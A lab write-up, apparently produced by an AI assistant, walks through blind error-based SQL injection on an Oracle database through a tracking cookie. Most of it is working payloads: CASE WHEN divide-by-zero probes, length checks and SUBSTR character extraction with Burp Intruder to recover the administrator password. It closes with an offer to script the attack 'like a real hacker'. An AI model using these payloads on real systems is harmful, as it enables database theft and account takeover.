
# 🛡️ Blind SQL Injection with Conditional Errors – Write-up

## 📌 Lab Overview

This lab demonstrates a **Blind SQL Injection (Error-based)** vulnerability using a **TrackingId cookie**.

* No data is returned in responses ❌
* No behavioral difference for true/false ❌
* BUT → **Server returns error messages when query fails** ✅

👉 Goal: Extract the **administrator password** and log in.

---

## 🔍 Step 1: Detect SQL Injection

We intercept the request using **Burp Suite** and modify the cookie:

```
TrackingId=xyz'
```

✅ Result: Error appears

Now test:

```
TrackingId=xyz''
```

✅ Result: No error

👉 Conclusion:

* The application is vulnerable
* The error is caused by **SQL syntax issues**

---

## 🧠 Step 2: Identify Database Type

We test a valid SQL query:

```
TrackingId=xyz'||(SELECT '')||'
```

❌ Error still occurs

Now try Oracle-style:

```
TrackingId=xyz'||(SELECT '' FROM dual)||'
```

✅ No error

👉 Conclusion:

* Database is **Oracle Database**
* Because it requires `FROM dual`

---

## 🧪 Step 3: Confirm SQL Execution

Test invalid table:

```
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
```

✅ Error occurs

👉 Confirms:

* Injection is executed as **SQL query**

---

## 📂 Step 4: Check if `users` Table Exists

```
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM=1)||'
```

✅ No error

👉 Table exists

---

## ⚙️ Step 5: Conditional Error Testing

We use **CASE WHEN + divide-by-zero**:

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

✅ Error

```
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

❌ No error

👉 Insight:

* We can trigger errors **conditionally**
* This becomes our **boolean channel**

---

## 👤 Step 6: Confirm Administrator User

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END 
FROM users WHERE username='administrator')||'
```

✅ Error

👉 User exists

---

## 🔢 Step 7: Find Password Length

```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END 
FROM users WHERE username='administrator')||'
```

Increase value step by step:

```
LENGTH(password)>2
LENGTH(password)>3
...
```

👉 When error stops → length found

✅ Final result:

```
Password length = 20
```

---

## 🔐 Step 8: Extract Password (Brute Force)

We use **SUBSTR()**:

```
TrackingId=xyz'||(SELECT CASE 
WHEN SUBSTR(password,1,1)='a' 
THEN TO_CHAR(1/0) ELSE '' END 
FROM users WHERE username='administrator')||'
```

---

### ⚡ Automate with Burp Intruder

1. Highlight `'a'`
2. Add payload markers:

```
'§a§'
```

3. Payload list:

```
a-z
0-9
```

---

### 📊 Result Analysis

* **HTTP 500 → correct character** ✅
* **HTTP 200 → incorrect** ❌

---

### 🔁 Repeat for Each Position

Change position:

```
SUBSTR(password,2,1)
SUBSTR(password,3,1)
...
SUBSTR(password,20,1)
```

👉 Extract full password

---

## 🔓 Step 9: Login

* Go to login page
* Username: `administrator`
* Password: (extracted value)

✅ Lab solved

---

## 🧠 Key Concepts Learned

* Blind SQL Injection (Error-based)
* Conditional queries using `CASE WHEN`
* Oracle-specific syntax (`dual`, `ROWNUM`)
* Data extraction via **side-channel (errors)**
* Automation using Burp Intruder

---

## ⚡ Final Insight

This lab shows that even when:

* No data is returned
* No visible difference exists

👉 **Errors alone are enough to fully dump a database**

---

If you want, Boss, I can also:

* Turn this into a **PDF report**
* Or show you how to **script this in Python (automation like a real hacker 🔥)**
